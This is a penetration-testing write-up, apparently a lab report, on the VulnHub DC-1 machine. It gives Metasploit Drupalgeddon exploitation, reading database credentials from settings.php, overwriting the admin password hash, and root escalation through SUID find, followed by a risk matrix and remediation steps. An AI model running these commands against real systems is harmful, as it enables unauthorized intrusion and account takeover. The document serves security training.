# DC-1 Security Assessment & Penetration Testing Walkthrough

> An end-to-end black-box penetration testing and security assessment of the **DC-1** vulnerable machine (VulnHub), executed inside an isolated virtual lab environment.

---

## Executive Summary

This assessment simulates a realistic internal penetration test against an enterprise asset running legacy Linux and an unpatched content management system (Drupal 7). The entire kill-chain was demonstrated:

1. **Reconnaissance & Discovery:** Network host identification, port scanning, and service version enumeration.
2. **Network Traffic Sniffing:** Clear-text protocol analysis via Wireshark exposing sensitive web parameters.
3. **Exploitation & Initial Foothold:** Remote Code Execution (RCE) via Drupalgeddon (CVE-2014-3704) using Metasploit.
4. **Post-Exploitation & Credential Harvesting:** Extracting backend database credentials and overwriting the Drupal administrator hash via MySQL.
5. **Privilege Escalation:** SUID binary abuse on `/usr/bin/find` to elevate privileges from low-privilege `www-data` to full `root`.

---

## Lab Architecture & Environment

| Component | Specification |
| :--- | :--- |
| **Target Machine** | DC-1 (Debian GNU/Linux 7 Wheezy) |
| **Attacker Machine** | Kali Linux (`10.0.2.4`) |
| **Virtualizer** | Oracle VM VirtualBox |
| **Network Type** | Isolated Custom NAT Network (`Midterm_Net`) |
| **Target Subnet** | `10.0.2.0/24` |
| **Target IP** | `10.0.2.6` |

---

## Penetration Testing Workflow

### Phase 1: Reconnaissance & Enumeration

#### 1. Network Discovery

Local network scanning identified the live host inside the subnet:

```bash
sudo arp-scan -l
```

#### 2. Service & Port Scanning

A full TCP port and service scan was executed using Nmap:

```bash
nmap -sC -sV -p- 10.0.2.6
```

**Key Open Ports:**
- `22/tcp`: OpenSSH 6.0p1 (Debian 4+deb7u7)
- `80/tcp`: Apache httpd 2.2.22 (Debian) running Drupal 7
- `111/tcp`: rpcbind 2-4

---

### Phase 2: Traffic Analysis (Clear-Text Exposure)

Passive packet capture using Wireshark on interface `eth0` confirmed all web interactions with `10.0.2.6` used unencrypted HTTP (port 80).

```bash
sudo wireshark
```

**Observation:** HTTP POST transactions revealed form variables, session headers, and authentication parameters without any transport layer security.

---

### Phase 3: Initial Foothold (Drupalgeddon - CVE-2014-3704)

The target CMS was identified as an unpatched Drupal 7.x installation susceptible to SQL injection and subsequent arbitrary PHP execution via the Drupalgeddon exploit.

**Metasploit Execution:**

```bash
msfconsole
search drupal
use exploit/multi/http/drupal_drupageddon
show options
set RHOSTS 10.0.2.6
exploit
```

A reverse shell was established under the low-privilege service account:

```bash
shell
whoami
# Output: www-data
id
# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

### Phase 4: Database Dumping & Password Manipulation

#### 1. Configuration Review

Inspection of the Drupal site configuration files exposed plaintext database credentials:

```bash
cd /var/www
cat sites/default/settings.php
```

- **Database User:** `dbuser`
- **Database Password:** `R0ck3t`
- **Database Name:** `drupaldb`

#### 2. Extracting User Hashes

Querying the MySQL backend revealed registered application users and their salted hashes:

```bash
mysql -u dbuser -pR0ck3t -e "use drupaldb; select name, pass from users;"
```

#### 3. Overwriting the Admin Password

Because Drupal 7 hashes are salted and computationally intensive to crack, Drupal's internal password-hashing script was utilized to generate a known hash and overwrite the admin password:

```bash
php scripts/password-hash.sh password
# Output Hash: $S$DhNsEVUad71u8s3HhOJKGA8KVO3eW2Y108I3T/RANiBdw4Ims8YR
```

The database was updated directly via MySQL:

```sql
mysql -u dbuser -p -D drupaldb
Enter password: R0ck3t

UPDATE users SET pass='$S$DhNsEVUad71u8s3HhOJKGA8KVO3eW2Y108I3T/RANiBdw4Ims8YR' WHERE name='admin';
exit;
```

**Result:** Administrative access to the Drupal web console (`http://10.0.2.6`) was obtained using the credentials `admin:password`.

---

### Phase 5: Local Privilege Escalation (Root Access)

#### 1. SUID Binary Enumeration

Searching for binaries configured with the SUID bit set:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Among standard utilities, `/usr/bin/find` was identified with administrative permissions retained.

#### 2. SUID Exploitation via GTFOBins

The `-exec` directive of the SUID `find` binary was abused to execute a privileged sub-shell:

```bash
find . -exec /bin/bash -p \; -quit
```

Verification of elevated privileges:

```bash
whoami
# Output: root
id
# Output: uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root)
```

---

## Vulnerability & Risk Matrix

| Finding | Vulnerability | Severity | Impact |
| :--- | :--- | :--- | :--- |
| Drupal 7 CMS | CVE-2014-3704 (Drupalgeddon) | Critical (9.8) | Remote Code Execution & unauthenticated initial access |
| SUID `/usr/bin/find` | Misconfigured file permissions | High (8.4) | Local privilege escalation directly to root |
| HTTP (Clear-Text) | Lack of Transport Layer Security | Medium (5.3) | Credential sniffing and session hijacking |
| World-Readable Configs | Insecure permissions on `settings.php` | Medium (5.5) | Plaintext credential harvesting of backend database |

---

## Remediation & Hardening Roadmap

1. **Patching & CMS Lifecycle**
   Upgrade Drupal to the latest stable release or migrate off end-of-life Drupal 7 installations.

2. **Access Control & SUID Stripping**
   Strip unnecessary SUID permissions from binary utilities:
   ```bash
   chmod u-s /usr/bin/find
   ```

3. **Transport Security**
   Enforce HTTPS using TLS 1.3 across the entire web interface and disable HTTP port 80 or redirect strictly to port 443.

4. **Least-Privilege Database & File Permissions**
   - Restrict access to `settings.php` to strictly administrative root accounts (`chmod 600 sites/default/settings.php`).
   - Limit the database account permissions so `dbuser` cannot arbitrarily execute destructive `UPDATE` statements on core tables from the web context.

---

## Disclaimer

This security assessment was executed strictly within an isolated, private virtual laboratory for educational and evaluation purposes. All penetration testing techniques followed proper authorization protocols.
